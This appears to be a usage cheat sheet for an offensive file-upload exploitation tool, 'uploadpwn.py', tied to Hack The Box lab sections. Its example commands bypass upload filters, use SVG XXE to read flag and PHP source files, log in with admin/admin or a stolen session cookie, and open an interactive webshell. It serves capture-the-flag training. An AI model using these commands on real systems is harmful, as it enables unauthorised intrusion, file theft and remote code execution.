# HTB Sections 6/7 — basic bypass, no login
python3 uploadpwn.py -t http://IP:PORT

# HTB Section 8 — SVG XXE, read flag directly
python3 uploadpwn.py -t http://IP:PORT --svg-read /flag.txt

# Read PHP source to find hidden upload dir
python3 uploadpwn.py -t http://IP:PORT --svg-src upload.php

# Login → simple form (auto-detects CSRF + field names)
python3 uploadpwn.py -t http://IP:PORT \
  --login /login.php --user admin --pass admin

# Login → then navigate to sub-page where upload lives
python3 uploadpwn.py -t http://IP:PORT \
  --login /login.php --user admin --pass admin \
  --nav /dashboard \
  --upload-page /profile/settings/avatar \
  --field profile_pic

# Already have a session cookie (grabbed from Burp)
python3 uploadpwn.py -t http://IP:PORT \
  --cookie "PHPSESSID=abc123def456"

# JS-heavy login (React, Angular, etc.)
python3 uploadpwn.py -t http://IP:PORT \
  --login /login --user admin --pass admin \
  --login-method selenium

# Drop into interactive webshell after RCE
python3 uploadpwn.py -t http://IP:PORT --interactive

# Run literally everything
python3 uploadpwn.py -t http://IP:PORT \
  --login /login.php --user admin --pass admin \
  --all --interactive -v
